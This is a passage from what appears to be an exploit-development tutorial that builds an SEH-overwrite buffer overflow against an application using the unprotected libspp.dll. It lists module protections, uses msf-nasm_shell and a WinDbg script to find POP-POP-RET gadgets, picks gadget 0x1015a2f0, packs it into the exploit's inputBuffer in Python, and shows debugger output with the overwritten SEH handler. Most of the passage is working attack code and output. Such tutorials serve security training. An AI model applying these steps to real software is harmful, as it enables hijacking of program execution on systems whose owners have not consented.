</span></span><span style="display:flex;"><span><span style="color:#ae81ff">72780000</span> <span style="color:#ae81ff">72796000</span> NLAapi               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>NLAapi.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">73610000</span> <span style="color:#ae81ff">73</span>c28000 windows_storage      <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>windows.storage.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74300000</span> <span style="color:#ae81ff">74311000</span> WKSCLI               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>WKSCLI.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74520000</span> <span style="color:#ae81ff">74552000</span> IPHLPAPI             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>IPHLPAPI.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74560000</span> <span style="color:#ae81ff">745f</span><span style="color:#ae81ff">0000</span> DNSAPI               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>DNSAPI.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">745f</span><span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">745f</span>b000 NETUTILS             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>NETUTILS.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74790000</span> <span style="color:#ae81ff">747e7000</span> mswsock              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>mswsock.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">749</span>d0000 <span style="color:#ae81ff">749f</span><span style="color:#ae81ff">5000</span> Wldp                 <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>Wldp.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74</span>cb0000 <span style="color:#ae81ff">74</span>cb8000 DPAPI                <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>DPAPI.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74e00000</span> <span style="color:#ae81ff">74e25000</span> SspiCli              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>SspiCli.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74f</span><span style="color:#ae81ff">10000</span> <span style="color:#ae81ff">7514e000</span> KERNELBASE           <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>KERNELBASE.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75150000</span> <span style="color:#ae81ff">75236000</span> gdi32full            <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>gdi32full.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75240000</span> <span style="color:#ae81ff">7525</span>b000 bcrypt               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>bcrypt.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75260000</span> <span style="color:#ae81ff">7535e000</span> CRYPT32              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>CRYPT32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75450000</span> <span style="color:#ae81ff">7546</span>d000 win32u               NO_SEH       <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>win32u.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75470000</span> <span style="color:#ae81ff">754</span>eb000 msvcp_win            <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>msvcp_win.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75540000</span> <span style="color:#ae81ff">7557</span>b000 cfgmgr32             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>cfgmgr32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75580000</span> <span style="color:#ae81ff">756</span>a0000 ucrtbase             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>ucrtbase.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75700000</span> <span style="color:#ae81ff">757e3000</span> ole32                <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>ole32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75940000</span> <span style="color:#ae81ff">75</span>bc1000 combase              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>combase.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">75</span>bd0000 <span style="color:#ae81ff">7600</span>b000 SETUPAPI             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>SETUPAPI.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76010000</span> <span style="color:#ae81ff">76055000</span> SHLWAPI              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>SHLWAPI.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76060000</span> <span style="color:#ae81ff">760f</span>d000 KERNEL32             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>KERNEL32.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76100000</span> <span style="color:#ae81ff">76187000</span> SHCORE               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>SHCORE.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76190000</span> <span style="color:#ae81ff">76226000</span> OLEAUT32             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>OLEAUT32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76230000</span> <span style="color:#ae81ff">762f</span><span style="color:#ae81ff">3000</span> RPCRT4               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>RPCRT4.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">763e0000</span> <span style="color:#ae81ff">763e7000</span> NSI                  NO_SEH       <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>NSI.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76560000</span> <span style="color:#ae81ff">76</span>b39000 SHELL32              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>SHELL32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>b40000 <span style="color:#ae81ff">76</span>bff000 MSVCRT               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>MSVCRT.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>c00000 <span style="color:#ae81ff">76</span>c77000 sechost              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>sechost.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>c80000 <span style="color:#ae81ff">76</span>ce3000 WS2_32               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>WS2_32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>cf0000 <span style="color:#ae81ff">76</span>d12000 GDI32                NO_SEH       <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>GDI32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76e20000</span> <span style="color:#ae81ff">76e9</span>d000 ADVAPI32             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>ADVAPI32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>ea0000 <span style="color:#ae81ff">76</span>ea6000 PSAPI                NO_SEH       <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>PSAPI.DLL
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>eb0000 <span style="color:#ae81ff">77027000</span> USER32               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>USER32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77030000</span> <span style="color:#ae81ff">771</span>cf000 ntdll                <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>ntdll.dll
</span></span></code></pre></div><p>There are several modules. However, the libspp.dll application DLL is a perfect candidate. It is compiled without any protections and is loaded in a memory range which does not contain null bytes.
We will use a WinDBG script to search for a POP32, POP32, RET instruction. We will use a classic WinDbg.
Narly did also give us the memory region of the library.</p>
<p>We want to gather all the possible opcodes of the POP instructions for each available register. We don&rsquo;t want to perform a &ldquo;pop esp&rdquo; as this will modify the esp, the stack pointer, and disrupt the stack frame. The rest of the register are fine for us.
let&rsquo;s find all the opcodes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-nasm_shell 
</span></span><span style="display:flex;"><span>nasm &gt; pop eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">58</span>                pop eax
</span></span><span style="display:flex;"><span>nasm &gt; pop ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  5B                pop ebx
</span></span><span style="display:flex;"><span>nasm &gt; pop ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">59</span>                pop ecx
</span></span><span style="display:flex;"><span>nasm &gt; pop edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  5A                pop edx
</span></span><span style="display:flex;"><span>nasm &gt; pop esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  5E                pop esi
</span></span><span style="display:flex;"><span>nasm &gt; pop edi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  5F                pop edi
</span></span><span style="display:flex;"><span>nasm &gt; pop ebp 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  5D                pop ebp
</span></span><span style="display:flex;"><span>nasm &gt; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  C3                ret
</span></span><span style="display:flex;"><span>nasm &gt; 
</span></span></code></pre></div><p>We can see that all the &ldquo;pop&rdquo; instruction start from opcode 58 to 5D. Ret opcode is C3.
With this information, we will execute a WinDBG script that will search <strong>around the base address of the module we want to search for these instructions, and find a pop, pop, ret, instruction</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.block 
</span></span><span style="display:flex;"><span>{ 
</span></span><span style="display:flex;"><span>	.<span style="color:#66d9ef">for</span> (r <span style="color:#960050;background-color:#1e0010">$</span>t0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x58</span>; <span style="color:#960050;background-color:#1e0010">$</span>t0 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x5F</span>; r <span style="color:#960050;background-color:#1e0010">$</span>t0 <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>t0 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x01</span>) 
</span></span><span style="display:flex;"><span>	{ 
</span></span><span style="display:flex;"><span>		.<span style="color:#66d9ef">for</span> (r <span style="color:#960050;background-color:#1e0010">$</span>t1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x58</span>; <span style="color:#960050;background-color:#1e0010">$</span>t1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x5F</span>; r <span style="color:#960050;background-color:#1e0010">$</span>t1 <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>t1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x01</span>) 
</span></span><span style="display:flex;"><span>		{ 
</span></span><span style="display:flex;"><span>			s<span style="color:#f92672">-</span>[<span style="color:#ae81ff">1</span>]b <span style="color:#ae81ff">10000000</span> <span style="color:#ae81ff">10226000</span> <span style="color:#960050;background-color:#1e0010">$</span>t0 <span style="color:#960050;background-color:#1e0010">$</span>t1 c3 
</span></span><span style="display:flex;"><span>		} 
</span></span><span style="display:flex;"><span>	} 
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s execute this script in WinDbg: <strong>remember to replace the address range of the module!</strong>
The results are that there are <strong>several chains of these instructions:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#f92672">&gt;&lt;</span>C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>user<span style="color:#960050;background-color:#1e0010">\</span>Desktop<span style="color:#960050;background-color:#1e0010">\</span>find_ppr.wds
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1015a2f0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x100087dd</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10008808</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1000881a</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10008829</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1001bb8a</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1001bc1f</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x100491e4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1006ef94</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1006ef9b</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008922a</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10089280</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008971d</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10089748</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008975a</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10089769</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10089ddb</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10089e01</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008a717</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008a7a3</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008b063</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008b082</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008b0e5</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008b0f8</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008b9f9</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008ba7f</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008bb8c</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1008bb95</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1009a662</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1009af98</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x100a4bdb</span>
</span></span></code></pre></div><p>Let&rsquo;s see that, for example, the first one, points to a valid chain, <strong>check that there is no pop esp before using this! And also check that the address does not have badchars!</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> u <span style="color:#ae81ff">0x1015a2f0</span> L3
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f0 <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f1 <span style="color:#ae81ff">5</span>b              pop     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f2 c3              ret
</span></span></code></pre></div><p>Each pop is in a different register, but as we said, it does not mind for now.
So, let&rsquo;s update the exploit so that the SEH handler structure points to this address: 0x1015a2f0
To do this easy, we can use the &ldquo;pack&rdquo; library to represent this address in little endian:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>inputBuffer<span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x1015a2f0</span>)) <span style="color:#75715e"># Overwrite SEH address with pop eax; pop ebx; ret </span>
</span></span></code></pre></div><p>And if we send the payload and see the handlers, we see that the handler has been modified to the 0x1015a2f0 address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span>c6000
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dfe0c
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">008e0000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span>c6000
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">91</span>c . <span style="color:#ae81ff">0000124</span>c
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">0060</span><span style="color:#ae81ff">8320</span>
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">003</span>b5000
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dfe0c
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x008dff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x0096df5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0x008dff44</span> 
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x41414141</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x1015a2f0</span>     _EXCEPTION_DISPOSITION  libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> u <span style="color:#ae81ff">0x1015a2f0</span> L3
